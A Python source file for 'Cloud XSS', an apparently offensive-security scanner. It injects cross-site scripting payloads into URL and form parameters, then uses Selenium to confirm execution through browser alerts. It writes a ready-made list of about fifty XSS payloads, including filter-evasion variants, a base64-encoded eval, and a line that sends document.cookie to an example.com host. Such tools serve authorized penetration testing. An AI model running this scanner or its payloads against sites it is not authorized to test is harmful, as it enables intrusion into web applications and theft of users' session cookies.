#!/usr/bin/env python3
# Cloud XSS - Advanced Cross-Site Scripting Scanner
# Enhanced version of XSSploit with more features and improved performance

import argparse
import re
import time
import os
import sys
import random
import json
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse, quote_plus
import platform
import logging
import datetime

# Check if colorama is installed, import if available
try:
    from colorama import init, Fore, Style
    colorama_available = True
    init(autoreset=True)
except ImportError:
    colorama_available = False

# Setup logging
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file = os.path.join(log_dir, f"cloudxss_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("CloudXSS")

# Colored output functions
def green(text):
    return f"{Fore.GREEN}{text}{Style.RESET_ALL}" if colorama_available else text

def red(text):
    return f"{Fore.RED}{text}{Style.RESET_ALL}" if colorama_available else text

def yellow(text):
    return f"{Fore.YELLOW}{text}{Style.RESET_ALL}" if colorama_available else text

def cyan(text):
    return f"{Fore.CYAN}{text}{Style.RESET_ALL}" if colorama_available else text

def magenta(text):
    return f"{Fore.MAGENTA}{text}{Style.RESET_ALL}" if colorama_available else text

# Banner
def print_banner():
    banner = """
   ▄████████  ▄█        ▄██████▄  ███    █▄  ████████▄
  ███    ███ ███       ███    ███ ███    ███ ███   ▀███
  ███    █▀  ███       ███    ███ ███    ███ ███    ███
  ███        ███       ███    ███ ███    ███ ███    ███
  ███        ███       ███    ███ ███    ███ ███    ███
  ███    █▄  ███       ███    ███ ███    ███ ███    ███
  ███    ███ ███▌    ▄ ███    ███ ███    ███ ███   ▄███
  ████████▀  █████▄▄██  ▀██████▀  ████████▀  ████████▀
        ▀     ▀
        █  ▄  █  ▄▀▄  ▄▀▀
        █ █▀█ █  █▀█  ▀▄▄
"""
    version_info = """
    Cloud XSS - Advanced Cross-Site Scripting Scanner
    Version: 2.0.0
    Enhanced with multiple detection methods and reporting
    """
    
    if colorama_available:
        banner = f"{Fore.CYAN}{banner}{Style.RESET_ALL}"
        version_info = f"{Fore.GREEN}{version_info}{Style.RESET_ALL}"
    
    print(banner)
    print(version_info)

# User agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
]

def get_arguments():
    parser = argparse.ArgumentParser(description="Cloud XSS - Advanced Cross-Site Scripting Scanner")
    parser.add_argument("-u", "--url", dest="url", help="Target URL")
    parser.add_argument("-x", "--xss-payloads", dest="payloads", default="xss.txt", help="XSS payloads wordlist file (default: xss.txt)")
    parser.add_argument("-p", "--parameter", dest="parameter", help="Parameter to test")
    parser.add_argument("-c", "--cookie", dest="cookie", help="Cookies to include with requests")
    parser.add_argument("-H", "--header", dest="headers", action="append", help="Custom headers (format: 'Header:Value')")
    parser.add_argument("-t", "--threads", dest="threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=0, help="Delay between requests in seconds (default: 0)")
    parser.add_argument("-b", "--browser", dest="browser", default="firefox", choices=["firefox", "chrome"], help="Browser to use (default: firefox)")
    parser.add_argument("-g", "--geckodriver", dest="geckodriver", default="geckodriver", help="Path to geckodriver (default: geckodriver)")
    parser.add_argument("--timeout", dest="timeout", type=int, default=3, help="Timeout for alert detection in seconds (default: 3)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("-o", "--output", dest="output", help="Output file to save results")
    parser.add_argument("-f", "--format", dest="format", default="txt", choices=["txt", "json", "html"], help="Output format (default: txt)")
    parser.add_argument("-a", "--auto", action="store_true", help="Automatically detect and test all parameters")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--no-reflection-check", action="store_true", help="Skip reflection check")
    parser.add_argument("--proxy", dest="proxy", help="Use proxy (format: 'http://host:port')")
    parser.add_argument("--custom-alert", dest="custom_alert", help="Custom JS to identify successful XSS beyond alerts")
    
    options = parser.parse_args()
    
    if not options.url:
        parser.print_help()
        sys.exit(1)
    
    if not options.auto and not options.parameter:
        if not options.no_reflection_check:
            print(yellow("[!] No parameter specified. Use --auto to auto-detect parameters or specify one with -p"))
            parser.print_help()
            sys.exit(1)
    
    # Add platform-specific extension for geckodriver if not provided
    if options.geckodriver == "geckodriver" and platform.system() == "Windows":
        options.geckodriver = "geckodriver.exe"
        
    return options

def get_driver_path(driver_name):
    """Get the path for the driver, checking common locations"""
    # Check current directory
    if os.path.exists(driver_name):
        return os.path.abspath(driver_name)
    
    # Check if it's in PATH
    for path in os.environ["PATH"].split(os.pathsep):
        driver_path = os.path.join(path, driver_name)
        if os.path.exists(driver_path) and os.access(driver_path, os.X_OK):
            return driver_path
            
    # For Windows, also check for .exe extension if not already included
    if platform.system() == "Windows" and not driver_name.endswith(".exe"):
        return get_driver_path(driver_name + ".exe")
            
    return driver_name  # Return the name and hope it works

def setup_browser(browser_type, geckodriver_path, headless=False, proxy=None, custom_options=None):
    """Set up and return a browser instance"""
    try:
        if browser_type.lower() == "firefox":
            options = FirefoxOptions()
            if headless:
                options.add_argument("--headless")
            
            if proxy:
                options.add_argument(f'--proxy-server={proxy}')
                
            if custom_options:
                for option in custom_options:
                    options.add_argument(option)
            
            # Set up the service with the path to geckodriver
            service = FirefoxService(executable_path=geckodriver_path)
            return webdriver.Firefox(service=service, options=options)
            
        elif browser_type.lower() == "chrome":
            options = ChromeOptions()
            if headless:
                options.add_argument("--headless")
            options.add_argument("--disable-notifications")
            options.add_argument("--disable-popup-blocking")
            
            if proxy:
                options.add_argument(f'--proxy-server={proxy}')
                
            if custom_options:
                for option in custom_options:
                    options.add_argument(option)
                    
            return webdriver.Chrome(options=options)
        else:
            logger.warning(f"Unsupported browser type: {browser_type}. Using Firefox instead.")
            options = FirefoxOptions()
            if headless:
                options.add_argument("--headless")
                
            service = FirefoxService(executable_path=geckodriver_path)
            return webdriver.Firefox(service=service, options=options)
    except WebDriverException as e:
        logger.error(f"Failed to initialize browser: {str(e)}")
        if "geckodriver" in str(e) and browser_type.lower() == "firefox":
            logger.error("Make sure geckodriver is in your PATH or provide the correct path with --geckodriver option")
        sys.exit(1)

def identify_parameters(url, headers=None, cookies=None, proxy=None):
    """Identify potential parameters in the URL and forms"""
    params = []
    parsed_url = urlparse(url)
    
    # Get parameters from URL query string
    if parsed_url.query:
        query_params = parse_qs(parsed_url.query)
        for param in query_params.keys():
            params.append(param)
    
    # Try to find form inputs
    try:
        request_headers = {"User-Agent": random.choice(USER_AGENTS)}
        if headers:
            for header in headers:
                if ':' in header:
                    key, value = header.split(':', 1)
                    request_headers[key.strip()] = value.strip()
        
        proxies = None
        if proxy:
            proxies = {
                "http": proxy,
                "https": proxy
            }
            
        response = requests.get(
            url, 
            headers=request_headers, 
            cookies=cookies, 
            proxies=proxies,
            timeout=10
        )
        
        soup = BeautifulSoup(response.text, "html.parser")
        
        # Find all form inputs
        for form_input in soup.find_all("input"):
            if form_input.get("name"):
                params.append(form_input.get("name"))
                
        # Find all form textareas
        for textarea in soup.find_all("textarea"):
            if textarea.get("name"):
                params.append(textarea.get("name"))
                
        # Find URL parameters in JavaScript
        js_params = re.findall(r'[?&]([^=&]+)=', response.text)
        params.extend(js_params)
                
    except Exception as e:
        logger.error(f"Error finding form parameters: {str(e)}")
    
    return list(set(params))  # Remove duplicates

def parse_cookies(cookie_string):
    """Parse cookie string into a dictionary"""
    if not cookie_string:
        return None
        
    cookies = {}
    for item in cookie_string.split(';'):
        if '=' in item:
            key, value = item.split('=', 1)
            cookies[key.strip()] = value.strip()
    return cookies

def test_reflection(parameter, url, value_of_parameter=None, headers=None, cookies=None, proxy=None):
    """Test if input is reflected in the response"""
    test_input = "CloudXSS_Test_" + str(random.randint(10000, 99999))
    url = url.strip('#')
    
    # Handle URL with or without parameters
    if "?" not in url:
        new_url = f"{url}?{parameter}={test_input}"
    else:
        if parameter + "=" in url:
            new_url = re.sub(
                f"{parameter}=([^&]*)",
                f"{parameter}={test_input}",
                url
            )
        else:
            new_url = f"{url}&{parameter}={test_input}"
    
    request_headers = {"User-Agent": random.choice(USER_AGENTS)}
    if headers:
        for header in headers:
            if ':' in header:
                key, value = header.split(':', 1)
                request_headers[key.strip()] = value.strip()
    
    proxies = None
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }
    
    try:
        response = requests.get(
            new_url, 
            headers=request_headers, 
            cookies=cookies,
            proxies=proxies,
            timeout=10
        )
        
        if test_input in response.text:
            logger.info(f"Parameter '{parameter}' reflects input in the response")
            return True, new_url
        else:
            logger.info(f"Parameter '{parameter}' does not reflect input in the response")
            return False, new_url
    except Exception as e:
        logger.error(f"Error testing reflection: {str(e)}")
        return False, url

def test_alert(browser, url, timeout=3, custom_js=None):
    """Test if an XSS payload triggers an alert or custom JS condition"""
    try:
        browser.get(url)
        
        # If there's custom JS to evaluate
        if custom_js:
            try:
                result = browser.execute_script(f"return Boolean({custom_js})")
                if result:
                    return True
            except Exception as e:
                logger.debug(f"Error executing custom JS: {str(e)}")
        
        # Check for alert
        try:
            WebDriverWait(browser, timeout).until(EC.alert_is_present())
            alert = browser.switch_to.alert
            alert.accept()
            return True
        except TimeoutException:
            return False
    except Exception as e:
        logger.error(f"Error testing alert: {str(e)}")
        return False

def save_results(results, output_file, format_type="txt", url=None, scan_info=None):
    """Save scan results to a file in the specified format"""
    try:
        if format_type == "txt":
            with open(output_file, 'w') as f:
                f.write("Cloud XSS - Scan Results\n")
                f.write("========================\n\n")
                
                if scan_info:
                    f.write("Scan Information:\n")
                    for key, value in scan_info.items():
                        f.write(f"{key}: {value}\n")
                    f.write("\n")
                
                if not results:
                    f.write("No XSS vulnerabilities found.\n")
                else:
                    f.write(f"Found {len(results)} XSS vulnerabilities:\n\n")
                    for i, vuln_url in enumerate(results, 1):
                        f.write(f"{i}. {vuln_url}\n")
        
        elif format_type == "json":
            data = {
                "target": url,
                "scan_date": datetime.datetime.now().isoformat(),
                "vulnerabilities_count": len(results),
                "vulnerabilities": results,
                "scan_info": scan_info
            }
            
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=4)
                
        elif format_type == "html":
            with open(output_file, 'w') as f:
                f.write(f"""
<!DOCTYPE html>
<html>
<head>
    <title>Cloud XSS Scan Results</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #2c3e50; }}
        .info {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .vuln {{ background-color: #fff8e1; padding: 10px; margin-bottom: 5px; border-left: 4px solid #ffc107; }}
        .count {{ font-weight: bold; color: {'red' if results else 'green'}; }}
    </style>
</head>
<body>
    <h1>Cloud XSS - Scan Results</h1>
    
    <div class="info">
        <h2>Scan Information</h2>
        <p><strong>Target URL:</strong> {url}</p>
        <p><strong>Scan Date:</strong> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
""")
                
                if scan_info:
                    for key, value in scan_info.items():
                        f.write(f"        <p><strong>{key}:</strong> {value}</p>\n")
                
                f.write(f"""
    </div>
    
    <h2>Results</h2>
    <p>Found <span class="count">{len(results)}</span> XSS vulnerabilities</p>
    
""")
                
                if results:
                    for i, vuln_url in enumerate(results, 1):
                        f.write(f'    <div class="vuln">\n')
                        f.write(f'        <p><strong>{i}.</strong> <a href="{vuln_url}" target="_blank">{vuln_url}</a></p>\n')
                        f.write(f'    </div>\n')
                else:
                    f.write('    <p>No XSS vulnerabilities were found.</p>\n')
                
                f.write("""
</body>
</html>
""")
                
        logger.info(f"Results saved to {output_file}")
    except Exception as e:
        logger.error(f"Error saving results: {str(e)}")

def create_payload_file():
    """Create a default XSS payload file if it doesn't exist"""
    filename = "xss.txt"
    if os.path.exists(filename):
        return
        
    payloads = [
        "<script>alert(1)</script>",
        "<script>alert(document.URL);</script>",
        "<ScRipT>alert(document.URL);</ScRipT>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.URL)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "\"><script>alert(1)</script>",
        "';alert(1)//",
        "\"><img src=x onerror=alert(1)>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "javascript:alert(1)",
        "><svg onload=alert(1)>",
        "'-alert(1)-'",
        "'-confirm(1)-'",
        "<script>fetch('https://example.com?cookie='+document.cookie)</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=1 onerror=alert(1) />",
        "\"onmouseover=alert(1)//",
        "\"autofocus onfocus=alert(1)//",
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "<div onmouseover=\"alert(1)\">Hover me</div>",
        "<svg/onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<iframe srcdoc=\"<img src=x onerror=alert(1)>\"></iframe>",
        "<math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg>",
        "'-alert(document.domain)-'",
        "<img/src=\"1\" onerror=setTimeout('alert(1)',1000);>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<details open ontoggle=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<embed src=\"javascript:alert(1)\">",
        "<object data=\"javascript:alert(1)\">",
        "<marquee onstart=alert(1)>",
        "<isindex onmouseover=\"alert(1)\" ",
        "<form action=\"javascript:alert(1)\"><input type=submit>",
        "<img src=x:x onerror=alert(1)>",
        "<svg><script>alert(1)</script>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">Click Me</text></a>",
        "<svg><a><animate attributeName=href values=\"javascript:alert(1)\" /></a><text x=\"20\" y=\"20\">Click Me</text>",
        "<svg><discard onbegin=alert(1)>",
        "<script src=\"data:text/javascript,alert(1)\"></script>",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
        "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    ]
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for payload in payloads:
                f.write(payload + '\n')
        logger.info(f"Created default XSS payload file: {filename}")
    except Exception as e:
        logger.error(f"Error creating default payload file: {str(e)}")

def create_requirements_file():
    """Create a requirements.txt file if it doesn't exist"""
    filename = "requirements.txt"
    if os.path.exists(filename):
        return
        
    requirements = [
        "selenium>=4.0.0",
        "requests>=2.25.1",
        "beautifulsoup4>=4.9.3",
        "colorama>=0.4.4",
        "webdriver-manager>=3.5.2"
    ]
    
    try:
        with open(filename, 'w') as f:
            for req in requirements:
                f.write(req + '\n')
        logger.info(f"Created requirements file: {filename}")
    except Exception as e:
        logger.error(f"Error creating requirements file: {str(e)}")

def create_readme_file():
    """Create a README.md file if it doesn't exist"""
    filename = "README.md"
    if os.path.exists(filename):
        return
        
    content = """# Cloud XSS Scanner

A powerful Python tool for detecting Cross-Site Scripting (XSS) vulnerabilities in web applications.

## Features

- Automatic parameter detection
- Multi-threaded scanning
- Multiple output formats (TXT, JSON, HTML)
- Custom headers and cookies support
- Proxy support
- Customizable alert detection
- Detailed logging

## Requirements

- Python 3.6+
- Firefox or Chrome browser
- Geckodriver (for Firefox) or Chromedriver (for Chrome)

## Installation

1. Clone this repository or download the files
2. Install required packages:

```bash
pip install -r requirements.txt
```

3. Make sure you have geckodriver in your PATH or specify its location with the `--geckodriver` option

## Usage

Basic usage:

```bash
python cloudxss.py -u "http://example.com/page.php?param=test" -p param
```

Auto-detect parameters:

```bash
python cloudxss.py -u "http://example.com/page.php" -a
```

Specify custom payloads file:

```bash
python cloudxss.py -u "http://example.com/page.php?param=test" -p param -x my_payloads.txt
```

Save results to HTML file:

```bash
python cloudxss.py -u "http://example.com/page.php?param=test" -p param -o results.html -f html
```

Use custom headers and cookies:

```bash
python cloudxss.py -u "http://example.com/page.php?param=test" -p param -H "Authorization: Bearer token" -c "session=abc123"
```

## Options

```
usage: cloudxss.py [-h] [-u URL] [-x PAYLOADS] [-p PARAMETER] [-c COOKIE]
                  [-H HEADERS] [-t THREADS] [-d DELAY]
                  [-b {firefox,chrome}] [-g GECKODRIVER] [--timeout TIMEOUT]
                  [--headless] [-o OUTPUT] [-f {txt,json,html}] [-a] [-v]
                  [--no-reflection-check] [--proxy PROXY]
                  [--custom-alert CUSTOM_ALERT]

Cloud XSS - Advanced Cross-Site Scripting Scanner

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL
  -x PAYLOADS, --xss-payloads PAYLOADS
                        XSS payloads wordlist file (default: xss.txt)
  -p PARAMETER, --parameter PARAMETER
                        Parameter to test
  -c COOKIE, --cookie COOKIE
                        Cookies to include with requests
  -H HEADERS, --header HEADERS
                        Custom headers (format: 'Header:Value')
  -t THREADS, --threads THREADS
                        Number of threads (default: 5)
  -d DELAY, --delay DELAY
                        Delay between requests in seconds (default: 0)
  -b {firefox,chrome}, --browser {firefox,chrome}
                        Browser to use (default: firefox)
  -g GECKODRIVER, --geckodriver GECKODRIVER
                        Path to geckodriver (default: geckodriver)
  --timeout TIMEOUT     Timeout for alert detection in seconds (default: 3)
  --headless            Run browser in headless mode
  -o OUTPUT, --output OUTPUT
                        Output file to save results
  -f {txt,json,html}, --format {txt,json,html}
                        Output format (default: txt)
  -a, --auto            Automatically detect and test all parameters
  -v, --verbose         Enable verbose output
  --no-reflection-check Skip reflection check
  --proxy PROXY         Use proxy (format: 'http://host:port')
  --custom-alert CUSTOM_ALERT
                        Custom JS to identify successful XSS beyond alerts
```

## License

MIT License
"""
    
    try:
        with open(filename, 'w') as f:
            f.write(content)
        logger.info(f"Created README file: {filename}")
    except Exception as e:
        logger.error(f"Error creating README file: {str(e)}")

def test_payload(payload_url, browser, timeout, custom_js, verbose):
    """Test a single payload URL for XSS vulnerability"""
    if verbose:
        logger.info(f"Testing: {payload_url}")
    else:
        sys.stdout.write(f"\r[*] Testing payload... ")
        sys.stdout.flush()
    
    if test_alert(browser, payload_url, timeout, custom_js):
        logger.info(f"XSS vulnerability found: {payload_url}")
        return payload_url
    return None

def main():
    # Print banner and create initial files
    print_banner()
    create_payload_file()
    create_requirements_file()
    create_readme_file()
    
    # Parse command line arguments
    options = get_arguments()
    
    url = options.url
    payloads_file = options.payloads
    parameter = options.parameter
    cookie_string = options.cookie
    header_strings = options.headers
    delay = options.delay
    threads = options.threads
    browser_type = options.browser
    geckodriver_path = options.geckodriver
    timeout = options.timeout
    headless = options.headless
    output_file = options.output
    output_format = options.format
    auto_detect = options.auto
    verbose = options.verbose
    skip_reflection = options.no_reflection_check
    proxy = options.proxy
    custom_js = options.custom_alert
    
    # Process cookies
    cookies = parse_cookies(cookie_string)
    
    # Get absolute path to geckodriver
    geckodriver_path = get_driver_path(geckodriver_path)
    
    scan_info = {
        "Target URL": url,
        "Start Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Browser": browser_type,
        "Threads": threads,
        "Headless Mode": "Yes" if headless else "No",
        "Geckodriver Path": geckodriver_path
    }
    
    # Auto-detect parameters if requested
    if auto_detect:
        logger.info("Auto-detecting parameters...")
        parameters = identify_parameters(url, header_strings, cookies, proxy)
        if not parameters:
            logger.error("No parameters detected. Please specify a parameter manually.")
            sys.exit(1)
        logger.info(f"Detected parameters: {', '.join(parameters)}")
    else:
        parameters = [parameter] if parameter else []
    
    # Check if payloads file exists
    if not os.path.isfile(payloads_file):
        logger.error(f"Payloads file not found: {payloads_file}")
        sys.exit(1)
    
    # Load payloads
    with open(payloads_file, 'r', encoding='utf-8') as f:
        payloads = [line.strip() for line in f if line.strip()]
    logger.info(f"Loaded {len(payloads)} XSS payloads")
    
    vulnerable_urls = []
    
    for param in parameters:
        # Get value of parameter if it exists in URL
        if param and param + "=" in url:
            param_value_match = re.search(f"{param}=([^&]*)", url)
            if param_value_match:
                param_value = param_value_match.group(1)
            else:
                param_value = ""
        else:
            param_value = ""
        
        # Test reflection if not skipped
        if not skip_reflection and param:
            is_reflected, test_url = test_reflection(param, url, param_value, header_strings, cookies, proxy)
            
            if not is_reflected:
                logger.warning(f"Parameter '{param}' may not be vulnerable to XSS")
                choice = input(cyan("[?] Do you still want to test this parameter? (y/n): "))
                if choice.lower() not in ["y", "yes"]:
                    continue
        
        # Create crafted URLs
        crafted_urls = []
        for payload in payloads:
            encoded_payload = quote_plus(payload)
            if "?" not in url:
                new_url = f"{url}?{param}={encoded_payload}"
            else:
                if param and param + "=" in url:
                    new_url = re.sub(
                        f"{param}=([^&]*)",
                        f"{param}={encoded_payload}",
                        url
                    )
                else:
                    new_url = f"{url}&{param}={encoded_payload}"
            crafted_urls.append(new_url)
        
        # Initialize browser
        logger.info(f"Setting up {browser_type} browser{' in headless mode' if headless else ''}")
        browser = setup_browser(browser_type, geckodriver_path, headless, proxy)
        
        try:
            # Test payloads
            logger.info(f"Testing {len(crafted_urls)} payloads against parameter '{param}'")
            
            if threads > 1:
                # Multi-threaded approach with one browser per thread
                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = []
                    for payload_url in crafted_urls:
                        if delay > 0:
                            time.sleep(delay)
                        
                        # Create a new browser for each thread
                        thread_browser = setup_browser(browser_type, geckodriver_path, headless, proxy)
                        futures.append(executor.submit(
                            test_payload, 
                            payload_url, 
                            thread_browser, 
                            timeout, 
                            custom_js, 
                            verbose
                        ))
                    
                    for future in concurrent.futures.as_completed(futures):
                        result = future.result()
                        if result:
                            vulnerable_urls.append(result)
            else:
                # Single-threaded approach
                for payload_url in crafted_urls:
                    if delay > 0:
                        time.sleep(delay)
                    
                    result = test_payload(payload_url, browser, timeout, custom_js, verbose)
                    if result:
                        vulnerable_urls.append(result)
        finally:
            # Close browser
            try:
                browser.quit()
            except:
                pass
    
    # Add end time to scan info
    scan_info["End Time"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Print summary
    if vulnerable_urls:
        print("\n" + green(f"[+] Found {len(vulnerable_urls)} XSS vulnerabilities:"))
        for i, url in enumerate(vulnerable_urls, 1):
            print(green(f"{i}. {url}"))
    else:
        print("\n" + yellow("[-] No XSS vulnerabilities found."))
    
    # Save results if output file specified
    if output_file:
        save_results(vulnerable_urls, output_file, output_format, url, scan_info)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + yellow("[!] Scan interrupted by user."))
        sys.exit(0)
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        if logger.level <= logging.DEBUG:
            import traceback
            traceback.print_exc()
        sys.exit(1)